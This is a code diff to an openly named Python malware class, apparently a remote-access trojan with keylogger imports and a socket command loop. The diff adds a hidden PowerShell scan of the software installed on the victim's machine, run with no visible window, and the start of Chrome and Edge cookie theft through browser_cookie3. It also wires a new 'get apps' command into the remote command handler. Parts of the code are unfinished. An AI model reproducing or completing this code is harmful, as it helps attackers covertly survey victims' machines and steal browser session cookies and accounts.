@@ -7,8 +7,8 @@ import stat
 import sys
 from keylogging import *
 from keylogging import keylogger
-from subprocess import call
-import browser_cookie3
+from subprocess import call,check_output,CREATE_NO_WINDOW
+from external import getappinfo
 # from colorama import Fore, Style
 
 class Malware:
@@ -18,11 +18,50 @@ class Malware:
         self.sock = st.socket(st.AF_INET, st.SOCK_STREAM)
 
     def get_all_apps(self):
-        pass
+        powershell_command = '''
+        Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*, HKLM:\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* |
+        Where-Object { $_.DisplayName -and $_.DisplayName -notmatch "Test Suite|Documentation|Development Libraries|Tcl/Tk|Bootstrap|Executables" } |
+        Select-Object DisplayName, DisplayVersion, Publisher |
+        Sort-Object DisplayName
+        '''
+
+        # Run the PowerShell command
+        get_all = check_output(
+            ["powershell", "-Command", powershell_command],
+            universal_newlines=True,
+            creationflags=CREATE_NO_WINDOW
+        )
+
+        return get_all
+        # for a,b in enumerate(get_all.splitlines()):
+        #     if a == 0:
+        #         pass
+        #     else:
+        #         d = getappinfo(b)
+        #         for x,y in d:
+        #             return f'{x} : {y}\n'
+        # self.sock.send(get_all.encode())
 
     def get_browser_cookies(self):
-        fetch_cookies = browser_cookie3
-        #fistlty look for available browsers and load to fetch
+        import browser_cookie3
+        apps = self.get_all_apps()
+        for a,b in enumerate(apps.splitlines()):
+            if a == 0:
+                pass
+            else:
+                d = getappinfo(b)
+                for x,y in d:
+                    if 'chrome' in str(y).lower():
+                        chrome_cookies = browser_cookie3.chrome()
+
+                        for get_chrome_cookies in chrome_cookies:
+                            return f'''
+                                Browser name : Chrome
+                                Browser version : 
+                            '''
+                    if 'edge' in str(y).lower():
+                        edge_cookies = browser_cookie3.edge()
+                            
 
 
     def get_network_infos(self):
@@ -299,6 +338,9 @@ class Malware:
                         file.close()
                     except Exception as err:
                         self.sock.send(str(err).encode())
+                
+                elif get_cmd == 'get apps' or get_cmd == 'fetch apps':
+                    self.get_all_apps()
 
                 elif get_cmd == 'pwd' or get_cmd == 'cwd':  
                     self.sock.send(os.getcwd().encode() + b"\n")
